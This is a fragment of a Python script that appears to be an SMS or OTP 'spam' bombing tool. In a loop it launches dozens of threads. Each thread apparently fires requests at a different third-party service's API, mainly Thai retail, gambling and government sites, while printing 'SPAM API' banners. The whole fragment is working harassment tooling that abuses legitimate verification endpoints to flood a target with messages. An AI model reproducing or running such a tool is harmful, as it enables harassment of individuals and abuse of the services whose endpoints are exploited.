...
for i in range(number):
    ...
    print("\33[92m SPAM API WWW.THECONCERT.COM")
    threading.Thread(target=api2).start()
    print("\33[92m SPAM API OK.RU")
    threading.Thread(target=api3).start()
    print("\33[92m SPAM API API.ZAAPI.CO")
    threading.Thread(target=api4).start()
    print("\33[92m SPAM API ICQ.COM")
    threading.Thread(target=api5).start()
    print("\33[92m SPAM API WWW.WONGNAI.COM")
    threading.Thread(target=api6).start()
    print("\33[92m SPAM API API.TRUE-SHOPPING.COM")
    threading.Thread(target=api7).start()
    print("\33[92m SPAM API B226.COM")
    threading.Thread(target=api8).start()
    print("\33[92m SPAM API THE1WEB-API.THE1.CO.TH")
    threading.Thread(target=api9).start()
    print("\33[92m SPAM API M.VCANBUY.COM")
    threading.Thread(target=api10).start()
    print("\33[92m SPAM API OCS-PROD-API.MAKROCLICK.COM")
    threading.Thread(target=api11).start()
    print("\33[92m SPAM API WWW.INSTAGRAM.COM")
    threading.Thread(target=api12).start()
    print("\33[92m SPAM API TH.KERRYEXPRESS.COM")
    threading.Thread(target=api13).start()
    print("\33[92m SPAM API COGNITO-IDP.AP-SOUTHEAST-1.AMAZONAWS.COM")
    threading.Thread(target=api14).start() 
    print("\33[92m SPAM API WWW.CARSOME.CO.TH")  
    threading.Thread(target=api15).start()
    print("\33[92m SPAM API NOCNOC.COM")
    threading.Thread(target=api16).start()
    print("\33[92m SPAM API WWW.MONOMAX.ME")
    threading.Thread(target=api17).start()
    print("\33[92m SPAM API M.PGWIN168.COM")
    threading.Thread(target=api18).start()
    print("\33[92m SPAM API WWW.SOM777.COM")
    threading.Thread(target=api19).start()
    print("\33[92m SPAM API API.QUICKCASH8.COM")
    threading.Thread(target=api20).start()
    print("\33[92m SPAM API API-CUSTOMER.LOTUSS.COM")
    threading.Thread(target=api21).start()
    print("\33[92m SPAM API LOGIN.S-MOMCLUB.COM")
    threading.Thread(target=api22).start()
    print("\33[92m SPAM API GLOBALAPI.POINTSPOT.CO")
    threading.Thread(target=api23).start()
    print("\33[92m SPAM API HDMALL.CO.TH")
    threading.Thread(target=api24).start()
    print("\33[92m SPAM API WWW.BIGTHAILAND.COM")
    threading.Thread(target=api25).start()
    print("\33[92m SPAM API API.CASHMARKET-TH.COM")
    threading.Thread(target=api26).start()
    print("\33[92m SPAM API BACARA888.COM")
    threading.Thread(target=api27).start()
    print("\33[92m SPAM API API.CDFOI9.COM")
    threading.Thread(target=api28).start() 
    print("\33[92m SPAM API API.JOOX.COM")
    threading.Thread(target=api29).start()
    print("\33[92m SPAM API WWW.THECONCERT.COM")
    threading.Thread(target=api30).start()
    print("\33[92m SPAM API SHOPGENIX.COM")
    threading.Thread(target=api31).start()
    print("\33[92m SPAM API UFA3BB.COM")
    threading.Thread(target=api32).start()
    print("\33[92m SPAM API WWW.CARS24.CO.TH")
    threading.Thread(target=api33).start()
    print("\33[92m SPAM API API.THAISME.ONE")
    threading.Thread(target=api34).start()
    print("\33[92m SPAM API APP.DROPRICH.CO")
    threading.Thread(target=api35).start()
    print("\33[92m SPAM API SPORT.AUTOPLAY.CLOUD")
    threading.Thread(target=api36).start()
    print("\33[92m SPAM API APIV3.SLOT999SS.COM")
    threading.Thread(target=api37).start()
    print("\33[92m SPAM API ID.ZILINGO.COM")
    threading.Thread(target=api38).start()
    print("\33[92m SPAM API TDHW.TREASURY.GO.TH")
    threading.Thread(target=api39).start()
    print("\33[92m SPAM API USER-API.LEARN.CO.TH")
    threading.Thread(target=api40).start()
    print("\33[92m SPAM API COGNITO-IDP.AP-SOUTHEAST-1.AMAZONAWS.COM")
    threading.Thread(target=api41).start()
    print("\33[92m SPAM API BKK-API.KS-IT.CO")
    threading.Thread(target=api42).start()
    print("\33[92m SPAM API SERVICE-API.AUTO1.CO.TH")
    threading.Thread(target=api43).start()
    print("\33[92m SPAM API WWW.KONVY.COM")
    threading.Thread(target=api44).start()
    print("\33[92m SPAM API VACCINE.TRUEID.NET")
    threading.Thread(target=api45).start()
    print("\33[92m SPAM API FINDCLONE.RU")
    threading.Thread(target=api46).start()
    print("\33[92m SPAM API KASPY.COM")
    threading.Thread(target=api47).start()
    print("\33[92m SPAM API PARTNERS-KYC.T2P.CO.TH")
    threading.Thread(target=api48).start()
    print("\33[92m SPAM API IPRO356.COM")
    threading.Thread(target=api49).start()
    print("\33[92m SPAM API WWW.SSO.GO.TH")
    threading.Thread(target=api50).start()
    print("\33[92m SPAM API WWW.VEGAS77SLOTS.COM")
    threading.Thread(target=api51).start()
    print("\33[92m SPAM API TOPPING.TRUEMOVEH.COM")
    threading.Thread(target=api52).start()
    print("\33[92m SPAM API API.MYFAVE.COM")
    threading.Thread(target=api53).start()
    print("\33[92m SPAM API API2.1112.COM")
    threading.Thread(target=api54).start()
    print("\33[92m SPAM API WWW.FOX888.COM")
    threading.Thread(target=api55).start()
    print("\33[92m SPAM API SALEHERE.CO.TH")